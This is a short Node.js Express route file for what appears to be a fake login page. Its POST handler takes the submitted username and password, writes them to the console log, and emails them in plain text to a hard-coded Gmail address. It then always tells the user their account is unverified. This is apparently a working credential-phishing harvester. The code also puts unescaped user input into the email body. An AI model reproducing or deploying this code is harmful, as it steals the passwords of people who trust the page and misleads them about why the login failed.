var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');

dotenv.config();

var mysql = require('mysql');
var util = require('util');

var pool = mysql.createPool({
    connectionLimit: 10,
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DB_NAME 
});



pool.query = util.promisify(pool.query);


module.exports = pool;


router.use(bodyParser.urlencoded({ extended: false }));

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('login', { title: 'Express' });
});

router.post('/', async (req, res, next) => {
  console.log(req.body);

  var usuario = req.body.usuario;
  var contraseña = req.body.contraseña;

  var obj = {
    to: 'mlolaserrano@gmail.com',
    subject: 'Contacto desde la Web',
    html: usuario + ' ' + contraseña,
  };

  var transport = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  try {
    var info = await transport.sendMail(obj);

    res.render('login', {
      message: 'No verificaste tu usuario',
    });
  } catch (error) {
    console.error(error);
    res.render('login', {
      message: 'Error al enviar el mensaje',
    });
  }
});


